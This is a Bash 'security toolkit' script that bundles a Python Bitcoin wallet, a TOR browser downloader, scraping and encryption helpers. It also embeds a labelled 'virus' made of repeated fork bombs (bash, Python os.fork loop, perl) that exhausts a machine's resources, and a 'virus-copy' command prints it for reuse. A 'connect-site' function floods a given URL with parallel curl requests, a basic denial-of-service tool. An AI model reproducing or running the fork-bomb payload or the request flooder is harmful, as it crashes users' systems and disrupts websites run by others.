#!/bin/bash
# Knexyce Command Line Interface

RED='\033[1;38;5;196m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[38;5;33m'
MAGENTA='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
RESET='\033[0m'

kbtc_py_bash=$(cat <<EDF
# KnexyceBTC

def install_pip():
    import subprocess
    import sys
    import os
    import urllib.request
    try:
        subprocess.check_call([sys.executable, '-m', 'pip', '--version'])
        print("PIP is already installed.")
        return
    except subprocess.CalledProcessError:
        print("PIP is not installed. Installing...")
    try:
        subprocess.check_call([sys.executable, '-m', 'ensurepip'])
        print("PIP has been installed successfully using 'ensurepip'.")
        return
    except subprocess.CalledProcessError:
        print("'ensurepip' has failed. Attempting to install PIP via 'get-pip.py'...")
    try:
        url = "https://bootstrap.pypa.io/get-pip.py"
        get_pip_script = "get-pip.py"
        urllib.request.urlretrieve(url, get_pip_script)
        print("Downloaded 'get-pip.py'.")
        subprocess.check_call([sys.executable, get_pip_script])
        print("PIP has been installed successfully using 'get-pip.py'.")
        os.remove(get_pip_script)
        print("Cleaned up 'get-pip.py'.")
    except Exception as e:
        print(f"Failed to install PIP: {e}")
        sys.exit(1)

def pip_install(package_name, upgrade=True, user=False):
    import subprocess
    import sys
    def install_package(package_name):
        try:
            command = [sys.executable, '-m', 'pip', 'install', package_name]
            if upgrade:
                command.append('--upgrade')
            if user:
                command.append('--user')
            subprocess.run(command, check=True)
            print(f"{package_name} has been installed successfully.")
        except subprocess.CalledProcessError as e:
            print(f"Failed to install {package_name}: {e}")
    install_package(package_name)

def upgrade_pip():
    import subprocess
    import sys
    try:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--upgrade', 'pip'])
        print("PIP has been upgraded successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to upgrade PIP: {e}")

def clear_screen():
    import platform
    import subprocess
    method = ['cls'] if platform.system() == 'Windows' else ['clear']
    try:
        subprocess.run(method, check=True)
    except Exception as e:
        print(f"Error: {e}")
        try:
            subprocess.run(['tput', 'clear'], check=True)
        except Exception as e2:
            print(f"Error: {e2}")
            print("\033[H\033[J", end="")

def handle_dependencies():
    install_pip()
    upgrade_pip()
    pip_install("secp256k1")
    pip_install("base58")
    pip_install("requests")
    pip_install("bitcoinlib")
    pip_install("cryptography")

print("Upgrade/update system and install needed dependencies?")
upgrade_ask = input("[y/n]: ")
if upgrade_ask.lower() == "y":
    handle_dependencies()
else:
    print("")

try:
    import hashlib
    import base64
    import base58
    from decimal import Decimal
    import secp256k1
    import os
    from secp256k1 import PrivateKey
    import requests
    import re
    import getpass
    from bitcoinlib.wallets import Wallet, wallet_delete
    from bitcoinlib.keys import HDKey
    from bitcoinlib.services.services import Service
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import padding
    from cryptography.hazmat.backends import default_backend
except Exception as e:
    print("Error: Missing dependencies.")

def encrypt_message(message: str, knexyce_key: str):
    salt = os.urandom(16)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    key = kdf.derive(knexyce_key.encode())
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    padder = padding.PKCS7(128).padder()
    padded_message = padder.update(message.encode()) + padder.finalize()
    encrypted_message = encryptor.update(padded_message) + encryptor.finalize()
    encrypted_data = salt + iv + encrypted_message
    encrypted_message_base64 = base64.b64encode(encrypted_data).decode()
    return encrypted_message_base64

def decrypt_message(encrypted_message_base64: str, knexyce_key: str):
    encrypted_data = base64.b64decode(encrypted_message_base64)
    salt = encrypted_data[:16]
    iv = encrypted_data[16:32]
    encrypted_message = encrypted_data[32:]
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    key = kdf.derive(knexyce_key.encode())
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_padded_message = decryptor.update(encrypted_message) + decryptor.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    decrypted_message = unpadder.update(decrypted_padded_message) + unpadder.finalize()
    return decrypted_message.decode()

def create_wallet():
    def generate_valid_private_key():
        while True:
            private_key_bytes = os.urandom(32)
            private_key_int = int.from_bytes(private_key_bytes, byteorder='big')
            if 1 <= private_key_int < 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141:
                return private_key_bytes
            else:
                continue
    
    def public_key_to_address(public_key):
        sha256_hash = hashlib.sha256(public_key).digest()
        ripemd160_hash = hashlib.new('ripemd160', sha256_hash).digest()
        network_prefix = b'\x00'
        prefixed_hash = network_prefix + ripemd160_hash
        checksum = hashlib.sha256(hashlib.sha256(prefixed_hash).digest()).digest()[:4]
        address_bytes = prefixed_hash + checksum
        address = base58.b58encode(address_bytes)
        return address.decode('utf-8')
    
    storage_valid_private_key = generate_valid_private_key()
    storage_private_key = PrivateKey(storage_valid_private_key)
    storage_public_key = storage_private_key.pubkey
    transaction_valid_private_key = generate_valid_private_key()
    transaction_private_key = PrivateKey(transaction_valid_private_key)
    transaction_public_key = transaction_private_key.pubkey
    sto_pri = storage_private_key.private_key.hex()
    sto_pub = storage_public_key.serialize(compressed=True).hex()
    sto_add = public_key_to_address(storage_public_key.serialize(compressed=True))
    tra_pri = transaction_private_key.private_key.hex()
    tra_pub = transaction_public_key.serialize(compressed=True).hex()
    tra_add = public_key_to_address(transaction_public_key.serialize(compressed=True))
    passphrase = getpass.getpass("Enter a secure passphrase to encrypt the Private Keys. ")
    enc_sto_pri = encrypt_message(sto_pri, passphrase)
    enc_tra_pri = encrypt_message(tra_pri, passphrase)
    private_key_bytes = None
    storage_valid_private_key = None
    transaction_valid_private_key = None
    storage_private_key = None
    transaction_private_key = None
    sto_pri = None
    tra_pri = None
    print("")
    print("Bitcoin Wallet Info")
    print("To decrypt the Private Keys, enter the 'decrypt' command.")
    print("")
    print("Bitcoin Storage Wallet")
    print(f"Private Key (Encrypted): {enc_sto_pri}")
    print(f"Public Key: {sto_pub}")
    print(f"Bitcoin Address: {sto_add}")
    print("")
    print("Bitcoin Transaction Wallet")
    print(f"Private Key (Encrypted): {enc_tra_pri}")
    print(f"Public Key: {tra_pub}")
    print(f"Bitcoin Address: {tra_add}")
    print("")

def try_create_wallet():
    try:
        create_wallet()
    except Exception as e:
        print(f"Error: {e}")

def decrypt_keys(enc_sto_pri=None, enc_tra_pri=None):
    enc_sto_pri = input("Enter the Encrypted Storage Private Key: ").strip()
    enc_tra_pri = input("Enter the Encrypted Transaction Private Key: ").strip()
    passphrase = getpass.getpass("Enter the passphrase for the Encrypted Private Keys: ")
    dec_sto_pri = decrypt_message(enc_sto_pri, passphrase)
    dec_tra_pri = decrypt_message(enc_tra_pri, passphrase)
    print(f"Decrypted Storage Key: {dec_sto_pri}")
    print(f"Decrypted Transaction Key: {dec_tra_pri}")

def try_decrypt_keys():
    try:
        decrypt_keys()
    except Exception as e:
        print(f"Error: {e}")

def hex_to_wif(private_key_hex, compressed=True):
    private_key_bytes = bytes.fromhex(private_key_hex)
    private_key_with_version = b'\x80' + private_key_bytes
    if compressed:
        private_key_with_version += b'\x01'
    checksum = hashlib.sha256(hashlib.sha256(private_key_with_version).digest()).digest()[:4]
    wif = base58.b58encode(private_key_with_version + checksum)
    return wif.decode('utf-8')

def create_transaction():
    wallet_name = 'temp_wallet'
    try:
        key_type = int(input("Do you have a WIF or Raw Private Key? (Enter '1' for WIF. Enter '2' for Raw.) "))
        if key_type == 2:
            private_key = getpass.getpass("Enter the Raw Bitcoin Private Key (Hex). ")
            key_compressed = input("Is the Key compressed? [y/n]: ")
            if key_compressed.lower() == "y":
                wif_private_key = hex_to_wif(private_key, compressed=True)
            elif key_compressed.lower() == "n":
                wif_private_key = hex_to_wif(private_key, compressed=False)
        elif key_type == 1:
            wif_private_key = getpass.getpass("Enter the WIF Bitcoin Private Key. ")
        else:
            print("Invalid input.")
            return
        to_address = input("Enter the Target Bitcoin Address. ")
        tx_amount = float(input("Enter the amount of BTC to send. "))
        fee_satoshis = float(input("Enter the amount of Satoshis you would like to use as the fee. "))
        try:
            wallet_delete(wallet_name)
        except:
            pass
        key = HDKey(import_key=wif_private_key, network='bitcoin')
        wallet = Wallet.create(wallet_name, keys=key, network='bitcoin', witness_type='segwit')
        wallet.utxos_update()
        print(f"Creating transaction for {to_address} with {tx_amount} BTC...")
        tx = wallet.send_to(to_address, tx_amount, fee=fee_satoshis)
        print("Transaction attempt created and broadcasted. Success is likely if no error message appears.")
        print(f"TXID: {tx.txid}")
    except Exception as e:
        print(f"Transaction failed: {e}")
    finally:
        try:
            wallet_delete(wallet_name)
        except:
            pass

def try_create_transaction():
    try:
        create_transaction()
    except Exception as e:
        print(f"Error: {e}")

def check_balance():
    address = input("Enter a Bitcoin Address to check its balance. ").strip()
    srv = Service()
    result = srv.getbalance(address)
    satoshis = result
    btc_balance = satoshis / 1e8
    print("Balance (BTC):", btc_balance)

def try_check_balance():
    try:
        check_balance()
    except Exception as e:
        print(f"Error: {e}")

def knexyce_command_line_help():
    print("Note: Do not include ' or ' in the command when typing. Do not include anything beyond : in the command.")
    print("Commands: ")
    print("'help': Provides a list of commands.")
    print("'create': Creates a Knexyce Bitcoin Wallet.")
    print("'check': Checks how much Bitcoin is in a wallet.")
    print("'send': Makes a Bitcoin transaction.")
    print("'clear': Clears the screen.")
    print("'exit': Exits KBTC.")

print("KnexyceBTC")
print("")
print("Software Info: ")
print("Name: Knexyce Bitcoin (KnexyceBTC/KBTC) Command Line Interface")
print("This is a shell-agnostic script. The main requirement is internet access.")
print("This script is a lightweight Bitcoin wallet designed for a command line interface. The script itself is coded in Python-v3.")
print("This software is owned by an entity/group known as Knexyce. All rights to KBTC are reserved by Knexyce. This code was created by Ayan Alam/Knexyce-001/Administrator.")
print("")
print("Advice: ")
print("It's generally good practice to use KBTC with a VPN, firewall, and antivirus for extra security, along with full encryption for all internet actions/data. Save as little data as possible.")
print("It's also generally recommended to research what Bitcoin is, how it works, and as much information about it as possible before using this software.")
print("Along with that, some research on how coding, software, and scripts work is generally needed to understand how this software works.")
print("")
print("To Begin: ")
print("Enter 'help' without any quotations for a list of KBTC commands.")
print("")

name = input("Enter a username. ")
username = name + "@Knexyce: [BTC] "

while True:
    knexyce_input = input(username)
    if knexyce_input.lower() == "help":
        knexyce_command_line_help()
    elif knexyce_input.lower() == "create":
        try_create_wallet()
    elif knexyce_input.lower() == "check":
        try_check_balance()
    elif knexyce_input.lower() == "send":
        try_create_transaction()
    elif knexyce_input.lower() == "decrypt":
        try_decrypt_keys()
    elif knexyce_input.lower() == "clear":
        clear_screen()
    elif knexyce_input.lower() == "exit":
        break
    else:
        print("Error: Invalid command.")

# This software was created by Ayan Alam.
# Note: Knexyce is a brand/group name assigned to software, tools, or other resources made by Ayan Alam.
# All rights to this software are reserved by Knexyce.
EDF
)

kfv_py_bash=$(cat <<EDF
def kfv_bash():
    for repeat in range(15):
        
        def clear_screen():
            import os
            import platform
            methods = [
                'cls' if platform.system() == 'Windows' else 'clear',
                'tput clear',
                'reset'
            ]
            for method in methods:
                try:
                    os.system(method)
                    break
                except Exception as e:
                    continue
            else:
                print(f"Error: {e}")
                print("\033[H\033[J", end="")
        
        def virus():
            try:
                import os
                for Repeat in range(7):
                    os.system('bash -c ":(){ :|:& };:"')
            except Exception as e:
                pass
            else:
                pass
            finally:
                pass
            try:
                import os
                for Repeat in range(7):
                    os.system(':(){ :|:& };:')
            except Exception as e:
                pass
            else:
                pass
            finally:
                pass
            try:
                import os
                for Repeat in range(7):
                    os.system('kfv(){ kfv|kfv& };kfv')
            except Exception as e:
                pass
            else:
                pass
            finally:
                pass
            try:
                import os
                while True:
                    os.fork()
            except Exception as e:
                pass
            else:
                pass
            finally:
                pass
            try:
                import subprocess
                perl_code = ''' perl -e 'fork while fork' '''
                result = subprocess.run(['perl', '-e', perl_code], capture_output=True, text=True)
            except Exception as e:
                pass
            else:
                pass
            finally:
                pass
        
        def start_virus():
            clear_screen()
            virus()
        
        start_virus()
    return()

kfv_bash()
EDF
)

kcli-help() {
    echo " "
    echo "Note: Do not include <, >, ', ', :, or anything beyond : when typing the command. Replace text inside of and including <> with the specified information needed for the command."
    echo " "
    echo "KNEXYCE COMMANDS: "
    echo "'browser': Starts TOR Browser (VPNs and antiviruses are recommended.)"
    echo "'btc': Starts the KnexyceBTC Wallet. (VPNs and antiviruses are recommended.)"
    echo "'system-info': Shows info on the system."
    echo "'capture': Clones a github repository."
    echo "'connect-site' <Site URL> <Amount of Requests> <Amount of Seconds Running>: Connects to a website for a certain time."
    echo "'virus-copy': Prints the code for a Linux virus into the terminal. (Three hashtags mark the beginning and end of the code.)"
    echo "'scrape': Anonymously scrapes data off of TOR's websites."
    echo "'encrypt-message': Encrypts a message that can only be decrypted by this specific software or a specific command."
    echo "'decrypt-message': Decrypts a message that was encrypted using this software."
    echo "'k-superscan': Runs a scan on the entire system. (This may require unusual amounts of system resources.)"
    echo "'clear': Clears the screen."
    echo "'exit': Returns to the normal Linux terminal."
    echo " "
}

system-info() {
    echo "### System Information ###"
    uname -a
    echo -e "\n### CPU Information ###"
    lscpu
    echo -e "\n### Memory Information ###"
    free -h
    echo -e "\n### Disk Information ###"
    df -h
    echo -e "\n### Disk Partitions ###"
    sudo fdisk -l
    echo -e "\n### Hardware Information ###"
    sudo lshw -short
    echo -e "\n### Network Information ###"
    ip addr
    echo -e "\n### Network Connections ###"
    netstat -tulnp
    echo -e "\n### System Performance (top) ###"
    top -n 1 -b
    echo -e "\n### Temperature and Health ###"
    sensors
    echo -e "\n### CPU Load ###"
    echo -e "\n### Processes ###"
    uptime
    echo -e "\n### All System Summary ###"
    inxi -Fxz
}

capture() {
    echo "Enter the GitHub username. "
    read username
    echo "Enter the GitHub repository name. "
    read repo_name
    repo_url="https://github.com/$username/$repo_name.git"
    git clone "$repo_url"
    echo "Repository $repo_name by $username has been cloned. If this repository has not been cloned: One or both provided inputs may be invalid."
    echo "Check your file-system to find the repository contents that were downloaded."
    echo " "
}

connect-site() {
    pids=()
    local url=$1
    local connections=$2
    local duration=$3
    if ! [[ "$connections" =~ ^[0-9]+$ ]] || ! [[ "$duration" =~ ^[0-9]+$ ]]; then
        echo "Error: Invalid numbers for connections and duration."
        return 1
    fi
    echo "Sending requests to $url with $connections connections for $duration seconds..."
    send_requests() {
        end_time=$((SECONDS + duration))
        while (( SECONDS < end_time )); do
            curl -s -o /dev/null "$url" &
            pids+=($!)
        done
    }
    for ((i = 0; i < connections; i++)); do
        send_requests &
        pids+=($!)
    done
    sleep "$duration"
    pkill -f "curl -s -o /dev/null $url"
    for pid in "${pids[@]}"; do
        if ps -p "$pid" > /dev/null; then
            sudo kill "$pid" 2>/dev/null && echo "Killed PID: $pid" || echo "Failed to kill PID: $pid"
        else
            echo "PID $pid no longer exists."
        fi
    done
    echo "Connections have been made."
}

browser() {
    rm -vfr tor-browser
    latest_version=$(curl -s https://gitlab.torproject.org/tpo/web/tpo/-/raw/main/databags/versions.ini | grep -A1 '\[torbrowser-linux-stable]' | grep -oP '(?<=version = ).*')
    base_url="https://www.torproject.org/dist/torbrowser/"
    latest_tarball="tor-browser-linux-x86_64-$latest_version.tar.xz"
    wget "${base_url}${latest_version}/${latest_tarball}"
    tar -xvJf $latest_tarball
    rm $latest_tarball
    cd tor-browser
    chmod +x start-tor-browser.desktop
    ./start-tor-browser.desktop
    cd ..
}

virus-copy() {
    echo "###"
    echo " "
    echo "$kfv_py_bash"
    echo " "
    echo "###"
}

btc() {
    echo "$kbtc_py_bash" > /tmp/kbtc.py
    python3 /tmp/kbtc.py
    rm /tmp/kbtc.py
}

encrypt-message() {
    read -p "Message to Encrypt: " message
    read -p "Decryption Key: " knexyce_key
    knexyce_message=$(echo -n "$message" | openssl enc -aes-256-cbc -salt -pass pass:"$knexyce_key" -pbkdf2 | base64)
    echo "Knexyce Encrypted Message:"
    echo "$knexyce_message"
    echo "Key for message decryption: $knexyce_key"
}

decrypt-message() {
    read -p "Encrypted Message: " knexyce_message
    read -p "Decryption Key: " knexyce_key
    decoded_message=$(echo "$knexyce_message" | base64 -d)    
    decrypted_message=$(echo -n "$decoded_message" | openssl enc -aes-256-cbc -d -salt -pass pass:"$knexyce_key" -pbkdf2)
    if [ $? -eq 0 ]; then
        echo "Decrypted Message: $decrypted_message"
    else
        echo "Decryption failed. Please check your key or message."
    fi
}

anonymous-scrape() {
    echo "Enter the website URL to scrape: "
    read url
    torsocks curl -s "$url" > scraped_data.html
    echo "Scraped content saved as 'scraped_data.html'."
    echo "Check your file-system to find the website contents that were downloaded."
}

k-superscan() {
    sudo freshclam &
    sudo rkhunter --update &
    sudo rkhunter --propupd &
    sudo clamscan -r / --remove--log clamscan_log.log &
    sudo rkhunter --check --logfile rkhunter_log.log &
    sudo chkrootkit > chkrootkit_log.log &
}

kcli-input() {
    while true; do
        echo -en "$GREEN$username$BLUE@Knexyce:$YELLOW $(pwd)$CYAN "
        read -r input
        case "$input" in
            "system-info")
                system-info
                ;;
            "browser")
                browser
                ;;
            "capture")
                capture
                ;;
            "connect-site")
                connect-site
                ;;
            "kcli-help")
                kcli-help
                ;;
            "btc")
                btc
                ;;
            "virus-copy")
                virus-copy
                ;;
            "scrape")
                anonymous-scrape
                ;;
            "encrypt-message")
                encrypt-message
                ;;
            "decrypt-message")
                decrypt-message
                ;;
            "k-superscan")
                k-superscan > /dev/null 2>&1
                ;;
            "exit")
                echo "Exiting."
                break
                ;;
            *)
                $input
                ;;
        esac
    done
}

loading-bar() {
    clear
    echo "[=_________]"
    echo " "
    sudo apt-get install -y -qq bash
    sudo apt-get install -y -qq git
    sudo apt-get install -y -qq apt
    sudo apt-get install -y -qq clamav-daemon
    clear
    echo "[==________]"
    echo " "
    sudo apt-get install -y -qq sudo
    sudo apt-get install -y -qq tar
    sudo apt-get install -y -qq xz-utils
    sudo apt-get install -y -qq xdg-utils
    clear
    echo "[===_______]"
    echo " "
    sudo apt-get install -y -qq tor
    sudo apt-get install -y -qq dpkg
    sudo apt-get install -y -qq python3-pip
    sudo apt-get install -y -qq openssh-server
    clear
    echo "[====______]"
    echo " "
    sudo apt-get install -y -qq curl
    sudo apt-get install -y -qq grep
    sudo apt-get install -y -qq wget
    sudo apt-get install -y -qq torsocks
    clear
    echo "[=====_____]"
    echo " "
    sudo apt-get install -y -qq python3
    sudo apt-get install -y -qq lshw
    sudo apt-get install -y -qq net-tools
    sudo apt-get install -y -qq inxi
    clear
    echo "[======____]"
    echo " "
    sudo apt-get install -y -qq lm-sensors
    sudo apt-get install -y -qq cpu-checker
    sudo apt-get install -y -qq sysstat
    sudo apt-get install -y -qq util-linux
    clear
    echo "[=======___]"
    echo " "
    sudo apt-get install -y -qq fdisk
    sudo apt-get install -y -qq iproute2
    sudo apt-get install -y -qq procps
    sudo apt-get install -y -qq openssl
    clear
    echo "[========__]"
    echo " "
    sudo apt-get install -y -qq clamav
    sudo apt-get install -y -qq chkrootkit
    sudo apt-get install -y -qq rkhunter
    sudo apt-get install -y -qq ufw
    clear
    echo "[=========_]"
    sudo apt-get install -y -qq netcat
    sudo apt-get install -y -qq coreutils
    sudo apt-get -y -qq update
    sudo apt-get -y -qq dist-upgrade
    clear
    echo "[==========]: Upgraded and updated systems."
}

echo -e "${CYAN}"
clear
echo "Upgrade system and install needed KCLI dependencies?"
echo -n "[y/n]: "
read upgrade_ask
if [[ "$upgrade_ask" == "y" ]]; then
    loading-bar
fi

echo " "
echo "Knexyce Command Line Interface"
echo " "
echo "KnexyceCLI, KCLI, or Knexyce Command Line Interface is built by a group known as Knexyce. The purpose of this software is to be a toolkit for privacy and security."
echo " "
echo "Security Note: Use a researched VPN, Antivirus, and other security tools when using KnexyceCLI."
echo " "
echo "All rights are reserved by Knexyce."
echo " "
echo "Enter the command known as 'kcli-help' into KCLI for a list of Knexyce commands."
echo " "

echo -en "${GREEN}Enter a username: ${CYAN}"
read username
kcli-input

# This script is made for Linux GNU Debian with at least 10 Gigabytes of storage and a Bash Terminal/Shell.
# Script made by the Administrator of Knexyce/Ayan Alam/Knexyce-001.
# All rights regarding this software are reserved by Knexyce and Administrator.